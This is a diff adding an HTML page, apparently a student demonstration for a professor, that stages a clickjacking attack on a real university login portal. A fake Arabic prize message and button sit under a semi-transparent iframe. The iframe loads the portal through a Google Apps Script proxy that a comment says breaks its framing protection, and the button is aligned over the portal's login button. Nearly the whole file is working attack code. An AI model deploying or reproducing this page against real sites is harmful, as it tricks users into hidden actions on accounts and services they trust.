@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Clickjacking - Final Success</title>
+    <style>
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; }
+        
+        /* طبقة المصيدة */
+        #decoy {
+            position: absolute; width: 100%; height: 100%;
+            background: #fff; display: flex; flex-direction: column;
+            align-items: center; justify-content: center; z-index: 1;
+        }
+
+        .claim-btn {
+            background-color: #4285f4; color: white; padding: 15px 50px;
+            border: none; border-radius: 6px; font-size: 18px;
+            margin-top: 345px; /* هذا الرقم يجعله فوق زر تسجيل الدخول بالضبط */
+        }
+
+        /* الإطار الذي يكسر الحماية */
+        #target-frame {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            opacity: 0.5; /* شفافية لتوضيح الهجوم للدكتور */
+            z-index: 2; border: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="decoy">
+        <h2 style="color: #d93025;">🎊 مبروك! لقد فزت بجائزة قيمة</h2>
+        <p>اضغط على الزر لتفعيل الحساب واستلام جائزتك</p>
+        <button class="claim-btn">تفعيل الحساب الآن</button>
+    </div>
+
+    <iframe id="target-frame" src="https://script.google.com/macros/s/AKfycbwYi-JpuxpaOqBKLK_E4JiZtUCA9DOpaBQxEXvpp0667mjl3QdqGL6hp-3WfPmqqse-sA/exec?url=https://portal.ust.edu.ye"></iframe>
+
+</body>
+</html>
+
